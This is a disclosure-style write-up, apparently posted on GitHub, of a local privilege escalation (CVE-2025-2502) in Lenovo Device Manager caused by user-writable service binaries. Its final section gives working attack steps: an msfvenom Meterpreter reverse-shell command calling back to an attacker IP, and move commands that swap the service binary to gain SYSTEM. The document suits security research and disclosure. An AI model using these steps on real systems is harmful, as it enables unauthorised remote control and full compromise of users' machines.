CVE-2025-2502 — Lenovo Device Manager: Local Privilege Escalation (POC)
While studying local privilege escalation techniques in a Windows lab, I installed Lenovo Device Manager to inspect its installed components. 
Browsing the ProgramData modules out of curiosity, I noticed oddly permissive ACLs on the module directories — files downloaded by the application 
were writable by standard users.

That raised a red flag: if a service binary stored in such a directory runs as LocalSystem, and a non-privileged user can alter the file content, 
a simple replace-and-reboot could make the service execute attacker-controlled code as SYSTEM.

To validate this hypothesis without impacting production systems, I built an isolated VM testbed (host-only network) and reproduced the conditions: 
install the vulnerable Device Manager + AI Picture plugin, confirm the file ACLs, inspect the service, and observe the service launching the binary 
as LocalSystem after replacement and reboot. The lab confirmed the escalation vector end-to-end.

In short:
TL;DR: A permissions flaw in Lenovo Device Manager (all versions observed) grants non-privileged users F (Full) control over downloaded tool binaries 
under C:\ProgramData\Lenovo\devicecenter\modules\…. A privileged service (KPICService_Lenovo) loads one such binary as LocalSystem; because an unprivileged 
user can replace that binary on disk, the service will start the replaced binary as SYSTEM after a reboot — enabling local privilege escalation. 
This writeup documents discovery, a high-level reproduction approach used in a controlled lab, indicators, and mitigations.
<img width="1756" height="108" alt="image" src="https://github.com/user-attachments/assets/b93b76b1-f2f2-436f-a5dd-72f4248600af" />

High-level reproduction
Setup lab
Host a Windows VM, snapshot it. Install Lenovo Device Manager and the AI Picture plugin (version matching the vulnerable sample). Ensure the VM is isolated from production networks.

<img width="867" height="597" alt="image" src="https://github.com/user-attachments/assets/9fcdeeaf-3600-4dc7-b646-6e7e8bc78c5a" />

Confirm service & permissions
Inspect the service configuration:
C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe
<img width="1024" height="589" alt="image" src="https://github.com/user-attachments/assets/ef41db4c-c148-4512-ad15-a8eb82d14427" />
<img width="897" height="84" alt="image" src="https://github.com/user-attachments/assets/e33ef6fe-910d-48cc-beab-0f4d2f841f6e" />

Validate replace-on-disk scenario
With the system booted into a state where the service process is locked, confirm an unprivileged account can move or rename the original kpicservice.exe file (or otherwise alter the content of the file on disk).

Replace the on-disk binary with a benign test binary under the same filename (lab-only). Reboot the VM. After boot, verify the service executed the replaced binary and that it executed with SYSTEM privileges.

Now for the practical steps I performed.
First I generated a kpicservice.exe payload: 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=4444 -f exe -o kpicservice.exe Then I moved the original file and replaced it with the generated shell:

move C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe kpicservice.exe
move Desktop\kpicservice.exe C:\ProgramData\Lenovo\devicecenter\modules\aipicture\5.1.80.8121\kpicservice.exe

After rebooting the device, the service started the replaced kpicservice.exe (the payload) and I obtained SYSTEM privileges.

<img width="921" height="677" alt="image" src="https://github.com/user-attachments/assets/35d8f450-356e-47b0-b4dd-41f5bbe6d31b" />

